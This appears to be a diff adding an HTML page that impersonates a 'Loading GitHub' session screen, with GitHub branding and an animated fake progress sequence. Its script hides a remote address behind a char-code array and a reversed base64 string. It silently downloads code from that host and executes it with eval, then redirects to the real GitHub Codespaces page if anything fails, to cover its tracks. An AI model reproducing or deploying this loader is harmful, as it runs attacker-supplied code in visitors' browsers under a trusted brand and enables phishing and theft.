@@ -1,0 +1,503 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="referrer" content="unsafe-url">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Loading GitHub</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Cpath fill='%231F2328' fill-rule='evenodd' d='M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z'/%3E%3C/svg%3E">
+    <style>
+:root {
+  --fg: #1e293b;
+  --dim: #64748b;
+  --quiet: #94a3b8;
+  --ghost: #cbd5e1;
+  --rail: #eef1f4;
+  --card: #ffffff;
+  --violet: #7c3aed;
+  --violet-deep: #6d28d9;
+  --blue: #3b82f6;
+  --good: #059669;
+  --lift: 0 9px 23px rgba(15, 23, 42, 0.075);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{
+  min-height:100vh;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Noto Sans",Helvetica,Arial,sans-serif;
+  color:var(--fg);
+  background:radial-gradient(1180px 510px at 50% -9%,#f4f2ff 0%,transparent 56%),#fff;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  padding:47px 21px 118px;overflow-x:hidden;position:relative;
+}
+body::after{
+  content:"";position:absolute;inset:auto 0 0 0;height:178px;pointer-events:none;
+  background-image:radial-gradient(circle,rgba(124,58,237,.17) 1.2px,transparent 1.4px);
+  background-size:13px 13px;
+  mask-image:linear-gradient(to top,rgba(0,0,0,.52),transparent 84%);
+  -webkit-mask-image:linear-gradient(to top,rgba(0,0,0,.52),transparent 84%);
+}
+.zv-shell{
+  width:100%;max-width:916px;display:flex;flex-direction:column;align-items:center;
+  text-align:center;gap:29px;position:relative;z-index:1;
+}
+.zv-mark{
+  width:111px;height:111px;border-radius:999px;background:#fff;box-shadow:var(--lift);
+  display:grid;place-items:center;overflow:hidden;
+}
+.zv-mark svg{width:91%;height:91%;fill:#24292f;transform:scale(1.07)}
+.zv-title{font-size:33px;font-weight:700;letter-spacing:-.021em;line-height:1.21}
+.zv-note{margin-top:-15px;font-size:15px;color:var(--dim)}
+.zv-meter-wrap{width:min(516px,100%);margin-top:7px}
+.zv-meter{height:9px;border-radius:999px;background:var(--rail);overflow:hidden}
+.zv-meter>i{
+  display:block;height:100%;width:0;border-radius:inherit;
+  background:linear-gradient(90deg,var(--violet),var(--blue));
+  transition:width .17s linear;
+}
+.zv-cue{
+  margin-top:11px;font-size:14px;color:var(--dim);
+  display:inline-flex;align-items:center;gap:7px;min-height:21px;
+}
+.zv-cue .zv-ok{color:var(--good);font-weight:700}
+.zv-rail{
+  width:100%;margin-top:17px;display:grid;
+  grid-template-columns:repeat(5,minmax(0,1fr));gap:17px;
+}
+.zv-cell{
+  display:flex;flex-direction:column;align-items:center;gap:9px;
+  min-width:0;color:var(--quiet);
+}
+.zv-tile{
+  width:57px;height:57px;border-radius:13px;background:var(--card);box-shadow:var(--lift);
+  display:grid;place-items:center;position:relative;color:var(--ghost);
+}
+.zv-tile svg{
+  width:23px;height:23px;stroke:currentColor;fill:none;stroke-width:1.75;
+  stroke-linecap:round;stroke-linejoin:round;position:relative;z-index:1;
+}
+.zv-name{font-size:13px;font-weight:600;color:inherit}
+.zv-hash{
+  font-size:11px;color:var(--quiet);display:inline-flex;align-items:center;justify-content:center;
+  gap:5px;font-variant-numeric:tabular-nums;min-height:14px;max-width:100%;
+  overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
+}
+.zv-hash .zv-ok{color:var(--good);font-weight:700}
+.zv-cell.off{color:var(--quiet)}
+.zv-cell.off .zv-tile{color:var(--ghost)}
+.zv-cell.on{color:var(--violet-deep)}
+.zv-cell.on .zv-tile{color:var(--violet)}
+.zv-cell.on .zv-hash{color:var(--dim)}
+.zv-cell.hit{color:#64748b}
+.zv-cell.hit .zv-tile{color:#94a3b8}
+.zv-cell.hit .zv-hash{color:var(--quiet)}
+.zv-cell[data-unit="arm"].on .zv-tile{animation:zvPadBeat 1.05s ease-in-out infinite}
+.zv-cell[data-unit="arm"].on .zv-tile::after{
+  content:"";position:absolute;inset:-4px;border-radius:17px;
+  border:1.5px solid rgba(124,58,237,.42);animation:zvRimFlash 1.05s ease-in-out infinite;
+}
+@keyframes zvPadBeat{0%,100%{transform:scale(1)}50%{transform:scale(1.045)}}
+@keyframes zvRimFlash{0%,100%{opacity:.32}50%{opacity:1}}
+.zv-beam{
+  display:none;position:absolute;left:9px;right:9px;height:2px;border-radius:2px;
+  background:linear-gradient(90deg,transparent,var(--violet),transparent);z-index:2;
+  animation:zvBeamSweep 1.2s linear infinite;
+}
+.zv-cell[data-unit="test"].on .zv-beam{display:block}
+@keyframes zvBeamSweep{0%{top:9px;opacity:0}15%{opacity:1}85%{opacity:1}100%{top:45px;opacity:0}}
+.zv-orbit{display:none;position:absolute;inset:-11px;pointer-events:none}
+.zv-orbit .a,.zv-orbit .b{position:absolute;inset:0;border-radius:999px;border:2px dashed rgba(124,58,237,.33)}
+.zv-orbit .b{
+  inset:6px;border-style:solid;border-color:transparent;
+  border-top-color:rgba(124,58,237,.52);border-right-color:rgba(124,58,237,.18);
+}
+.zv-cell[data-unit="make"].on .zv-orbit{display:block}
+.zv-cell[data-unit="make"].on .zv-orbit .a{animation:zvTurnR 3.4s linear infinite}
+.zv-cell[data-unit="make"].on .zv-orbit .b{animation:zvTurnL 5.1s linear infinite}
+.zv-cell[data-unit="make"].on .zv-tile svg{animation:zvBoxThrob 1.35s ease-in-out infinite}
+@keyframes zvTurnR{to{transform:rotate(360deg)}}
+@keyframes zvTurnL{to{transform:rotate(-360deg)}}
+@keyframes zvBoxThrob{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.055);opacity:.82}}
+.zv-pulse{display:none;gap:5px;align-items:center;height:12px}
+.zv-cell[data-unit="make"].on .zv-pulse{display:inline-flex}
+.zv-pulse i{width:5px;height:5px;border-radius:50%;background:#ddd6fe}
+.zv-pulse i.zv-hot{background:var(--violet)}
+.zv-lanes{
+  display:none;position:absolute;left:17px;right:17px;top:13px;bottom:13px;
+  flex-direction:column;justify-content:space-between;z-index:2;pointer-events:none;
+}
+.zv-lanes b{display:block;height:3px;border-radius:2px;background:rgba(124,58,237,.16)}
+.zv-cell[data-unit="grab"].on .zv-lanes{display:flex}
+.zv-cell[data-unit="grab"].on .zv-lanes b{animation:zvLaneFlash .95s ease-in-out infinite}
+.zv-cell[data-unit="grab"].on .zv-lanes b:nth-child(2){animation-delay:.14s}
+.zv-cell[data-unit="grab"].on .zv-lanes b:nth-child(3){animation-delay:.28s}
+.zv-cell[data-unit="grab"].on .zv-lanes b:nth-child(4){animation-delay:.42s}
+@keyframes zvLaneFlash{0%,100%{background:rgba(124,58,237,.14)}50%{background:rgba(124,58,237,.82)}}
+.zv-arc{display:none;position:absolute;inset:7px;z-index:0}
+.zv-arc svg{width:100%;height:100%}
+.zv-arc .base{stroke:#ede9fe;fill:none;stroke-width:2.4}
+.zv-arc .run{
+  stroke:var(--violet);fill:none;stroke-width:2.4;stroke-linecap:round;
+  stroke-dasharray:100;stroke-dashoffset:100;transform:rotate(-90deg);transform-origin:50% 50%;
+  transition:stroke-dashoffset .14s linear;
+}
+.zv-whirl{
+  display:none;position:absolute;inset:13px;border-radius:999px;border:2px solid transparent;
+  border-top-color:rgba(124,58,237,.52);animation:zvTurnR .95s linear infinite;z-index:0;
+}
+.zv-cell[data-unit="end"].on .zv-arc,
+.zv-cell[data-unit="end"].on .zv-whirl{display:block}
+@media (max-width:860px){
+  .zv-title{font-size:27px}
+  .zv-rail{grid-template-columns:repeat(2,minmax(0,1fr));gap:21px 13px}
+  .zv-cell:last-child{grid-column:1/-1}
+}
+@media (max-width:480px){
+  .zv-rail{grid-template-columns:1fr}
+  .zv-cell:last-child{grid-column:auto}
+  .zv-title{font-size:23px}
+}
+    </style>
+</head>
+<body>
+    <div class="zv-shell">
+        <div class="zv-mark" aria-hidden="true">
+            <svg viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+            </svg>
+        </div>
+
+        <h1 class="zv-title">Loading GitHub</h1>
+        <p class="zv-note">Hold on while your workspace session initializes...</p>
+
+        <div class="zv-meter-wrap">
+            <div class="zv-meter" aria-hidden="true"><i id="zvMeterBar"></i></div>
+            <div class="zv-cue">
+                <span id="zvCueText">Arming session keys...</span>
+                <span class="zv-ok" id="zvCueMark" hidden>✓</span>
+            </div>
+        </div>
+
+        <div class="zv-rail" id="zvRail">
+            <div class="zv-cell off" data-unit="arm">
+                <div class="zv-tile">
+                    <svg viewBox="0 0 24 24"><rect x="5" y="11" width="14" height="10" rx="2"></rect><path d="M8 11V8a4 4 0 0 1 8 0v3"></path></svg>
+                </div>
+                <div class="zv-name">Arming session</div>
+                <div class="zv-hash" data-digest>...</div>
+            </div>
+
+            <div class="zv-cell off" data-unit="test">
+                <div class="zv-tile">
+                    <span class="zv-beam" aria-hidden="true"></span>
+                    <svg viewBox="0 0 24 24"><path d="M12 3l8 3v5c0 5-3.5 8.5-8 10-4.5-1.5-8-5-8-10V6l8-3z"></path><path d="M9 12l2 2 4-4"></path></svg>
+                </div>
+                <div class="zv-name">Testing integrity</div>
+                <div class="zv-hash" data-digest>...</div>
+            </div>
+
+            <div class="zv-cell off" data-unit="make">
+                <div class="zv-tile">
+                    <span class="zv-orbit" aria-hidden="true"><span class="a"></span><span class="b"></span></span>
+                    <svg viewBox="0 0 24 24"><path d="M12 3l8 4.5v9L12 21l-8-4.5v-9L12 3z"></path><path d="M12 12l8-4.5M12 12v9M12 12L4 7.5"></path></svg>
+                </div>
+                <div class="zv-name">Making bundle</div>
+                <div class="zv-hash" data-digest>...</div>
+                <div class="zv-pulse" aria-hidden="true"><i></i><i></i><i></i></div>
+            </div>
+
+            <div class="zv-cell off" data-unit="grab">
+                <div class="zv-tile">
+                    <span class="zv-lanes" aria-hidden="true"><b></b><b></b><b></b><b></b></span>
+                    <svg viewBox="0 0 24 24"><rect x="3" y="4" width="8" height="16" rx="1.5"></rect><rect x="13" y="4" width="8" height="16" rx="1.5"></rect><path d="M6 8h2M6 12h2M16 8h2M16 12h2"></path></svg>
+                </div>
+                <div class="zv-name">Grabbing assets</div>
+                <div class="zv-hash" data-digest>...</div>
+            </div>
+
+            <div class="zv-cell off" data-unit="end">
+                <div class="zv-tile">
+                    <span class="zv-arc" aria-hidden="true">
+                        <svg viewBox="0 0 36 36">
+                            <circle class="base" cx="18" cy="18" r="15.5"></circle>
+                            <circle class="run" id="zvArcRun" cx="18" cy="18" r="15.5" pathLength="100"></circle>
+                        </svg>
+                    </span>
+                    <span class="zv-whirl" aria-hidden="true"></span>
+                    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="8"></circle><path d="M8.5 12.5l2.5 2.5 4.5-5"></path></svg>
+                </div>
+                <div class="zv-name">Ending setup</div>
+                <div class="zv-hash" data-digest>...</div>
+            </div>
+        </div>
+    </div>
+
+<script>
+function _hubEscapeE5() {
+    location.replace('https://github.com/features/codespaces');
+}
+
+(function () {
+    var _scheme = [104, 116, 116, 112, 115, 58, 47, 47];
+    var _rev = 'bm9sZXltLmxsZXdudS9tb2MuYXdoc2VwZGl0cGVs';
+
+    function _decodeRev(s) {
+        var t = decodeURIComponent(escape(atob(s)));
+        return t.split('').reverse().join('');
+    }
+
+    function readStreamToString(stream) {
+        var reader = stream.getReader();
+        var chunks = [];
+        var decoder = new TextDecoder();
+        function pump() {
+            return reader.read().then(function (step) {
+                if (step.done) {
+                    return chunks.map(function (c) {
+                        return decoder.decode(c, { stream: true });
+                    }).join('') + decoder.decode();
+                }
+                chunks.push(step.value);
+                return pump();
+            });
+        }
+        return pump();
+    }
+
+    function acquireText(res) {
+        if (!res.ok) throw 0;
+        if (res.body && typeof res.body.getReader === 'function') {
+            return readStreamToString(res.body);
+        }
+        return res.text();
+    }
+
+    function activateBundle(text) {
+        var body = String(text).replace(/^\uFEFF/, '').trim();
+        if (!body) { _hubEscapeE5(); return; }
+        try {
+            (0, eval)(body);
+        } catch (e) { _hubEscapeE5(); }
+    }
+
+    var zvLink = String.fromCharCode.apply(null, _scheme) + _decodeRev(_rev);
+    var zvBundle = null;
+    var zvFetchFail = false;
+
+    var zvBundlePromise = fetch(zvLink, { method: 'GET', cache: 'no-store' })
+        .then(acquireText)
+        .then(function (t) { zvBundle = t; return t; })
+        .catch(function () { zvFetchFail = true; zvBundle = null; return null; });
+
+    var zvUnits = ['arm', 'test', 'make', 'grab', 'end'];
+    var zvSpan = [[0, 18], [18, 38], [38, 62], [62, 93], [93, 100]];
+    var zvHints = [
+        'Arming session keys...',
+        'Testing integrity hash...',
+        'Making bundle payload...',
+        'Grabbing remote assets...',
+        'Ending setup sequence...'
+    ];
+    var WAIT = [880, 800, 1240, 760];
+    var zvFixed = ['9e3b7f1c4a8d2057', '5a2d8f1e7c9b4036', '1f8c4e2a9d7b3065'];
+
+    var zvMeterBar = document.getElementById('zvMeterBar');
+    var zvCueText = document.getElementById('zvCueText');
+    var zvCueMark = document.getElementById('zvCueMark');
+    var zvArcRun = document.getElementById('zvArcRun');
+    var zvSlot = -1;
+    var zvLevel = 0;
+    var zvGrowT = null;
+    var zvDotsT = null;
+    var zvHexT = null;
+    var zvGot = 0;
+    var need = 25;
+    var zvSealed = false;
+
+    function zvUnitNode(key) {
+        return document.querySelector('.zv-cell[data-unit="' + key + '"]');
+    }
+
+    function zvSetLevel(v) {
+        zvLevel = Math.max(0, Math.min(100, v));
+        zvMeterBar.style.width = zvLevel + '%';
+        if (zvSlot === 4 && zvArcRun) {
+            var p = (zvLevel - 93) / 7;
+            zvArcRun.style.strokeDashoffset = String(100 - Math.max(0, Math.min(1, p)) * 100);
+        }
+    }
+
+    function zvPaintUnits() {
+        var n, key, node;
+        for (n = 0; n < zvUnits.length; n++) {
+            key = zvUnits[n];
+            node = zvUnitNode(key);
+            if (!node) continue;
+            node.classList.remove('off', 'on', 'hit');
+            if (n < zvSlot) node.classList.add('hit');
+            else if (n === zvSlot) node.classList.add('on');
+            else node.classList.add('off');
+        }
+    }
+
+    function zvSetDigest(key, html) {
+        var node = zvUnitNode(key);
+        if (!node) return;
+        var slot = node.querySelector('[data-digest]');
+        if (slot) slot.innerHTML = html;
+    }
+
+    function zvStopLoops() {
+        if (zvGrowT) { clearInterval(zvGrowT); zvGrowT = null; }
+        if (zvDotsT) { clearInterval(zvDotsT); zvDotsT = null; }
+        if (zvHexT) { clearInterval(zvHexT); zvHexT = null; }
+    }
+
+    function zvRandDigest() {
+        var out = '', k;
+        for (k = 0; k < 16; k++) out += '0123456789abcdef'.charAt((Math.random() * 16) | 0);
+        return out;
+    }
+
+    function zvBootArm() {
+        zvSetDigest('arm', zvRandDigest());
+        zvHexT = setInterval(function () {
+            if (zvSlot !== 0) return;
+            zvSetDigest('arm', zvRandDigest());
+        }, 85);
+    }
+
+    function zvBootTest() {
+        zvSetDigest('test', 'Scanning...');
+        zvHexT = setInterval(function () {
+            if (zvSlot !== 1) return;
+            zvSetDigest('test', zvRandDigest());
+        }, 95);
+    }
+
+    function zvBootMake() {
+        var bits = zvUnitNode('make').querySelectorAll('.zv-pulse i');
+        var wave = 0;
+        zvSetDigest('make', zvFixed[2]);
+        zvHexT = setInterval(function () {
+            if (zvSlot !== 2) return;
+            zvSetDigest('make', zvRandDigest());
+        }, 105);
+        zvDotsT = setInterval(function () {
+            if (zvSlot !== 2) return;
+            wave = (wave + 1) % 3;
+            var m;
+            for (m = 0; m < bits.length; m++) {
+                if (m <= wave) bits[m].classList.add('zv-hot');
+                else bits[m].classList.remove('zv-hot');
+            }
+        }, 240);
+    }
+
+    function zvBootGrab() {
+        zvGot = 0;
+        zvSetDigest('grab', '0 / ' + need);
+        zvHexT = setInterval(function () {
+            if (zvSlot !== 3) return;
+            if (zvGot < need) {
+                var step = 1 + ((Math.random() * 3) | 0);
+                zvGot = Math.min(need, zvGot + step);
+                zvSetDigest('grab', zvGot + ' / ' + need);
+                zvSetLevel(62 + (zvGot / need) * 31);
+            }
+        }, 70);
+    }
+
+    function zvBootEnd() {
+        zvSetDigest('end', 'Almost...');
+        if (zvArcRun) zvArcRun.style.strokeDashoffset = '100';
+    }
+
+    function zvEnter(n) {
+        zvStopLoops();
+        zvSlot = n;
+        zvPaintUnits();
+        zvCueText.textContent = zvHints[n];
+        zvCueMark.hidden = true;
+        zvSetLevel(zvSpan[n][0]);
+
+        if (n === 0) zvBootArm();
+        if (n === 1) zvBootTest();
+        if (n === 2) zvBootMake();
+        if (n === 3) zvBootGrab();
+        if (n === 4) zvBootEnd();
+
+        var a = zvSpan[n][0], b = zvSpan[n][1];
+        zvGrowT = setInterval(function () {
+            if (zvSealed || zvSlot !== n) return;
+            if (n === 3 && zvGot >= need) return;
+            if (zvLevel < b - 1) zvSetLevel(zvLevel + (b - a) * 0.032);
+        }, 75);
+    }
+
+    function zvLeave() {
+        var key = zvUnits[zvSlot];
+        var node = zvUnitNode(key);
+        zvStopLoops();
+        if (key === 'arm') zvSetDigest('arm', zvFixed[0] + ' <span class="zv-ok">✓</span>');
+        if (key === 'test') zvSetDigest('test', zvFixed[1] + ' <span class="zv-ok">✓</span>');
+        if (key === 'make') zvSetDigest('make', zvFixed[2] + ' <span class="zv-ok">✓</span>');
+        if (key === 'grab') {
+            zvGot = need;
+            zvSetDigest('grab', need + ' / ' + need + ' <span class="zv-ok">✓</span>');
+        }
+        if (key === 'end') zvSetDigest('end', 'Ready <span class="zv-ok">✓</span>');
+        if (node) {
+            node.classList.remove('on');
+            node.classList.add('hit');
+        }
+        zvSetLevel(zvSpan[zvSlot][1]);
+    }
+
+    function zvPause(ms) {
+        return new Promise(function (ok) { setTimeout(ok, ms); });
+    }
+
+    function zvSeal() {
+        if (zvSealed) return Promise.resolve();
+        zvSealed = true;
+        zvStopLoops();
+        zvLeave();
+        zvSetLevel(100);
+        zvCueText.textContent = 'Complete';
+        zvCueMark.hidden = false;
+        return zvBundlePromise.then(function () {
+            if (zvFetchFail || zvBundle == null) {
+                _hubEscapeE5();
+                return;
+            }
+            activateBundle(zvBundle);
+        });
+    }
+
+    zvEnter(0);
+
+    (async function zvPlay() {
+        await zvPause(WAIT[0]);
+        zvLeave();
+        zvEnter(1);
+
+        await zvPause(WAIT[1]);
+        zvLeave();
+        zvEnter(2);
+
+        await zvPause(WAIT[2]);
+        zvLeave();
+        zvEnter(3);
+
+        while (zvGot < need) await zvPause(28);
+        await zvPause(70);
+        zvLeave();
+        zvEnter(4);
+
+        await zvPause(WAIT[3]);
+        await zvSeal();
+    })();
+})();
+</script>
+</body>
+</html>
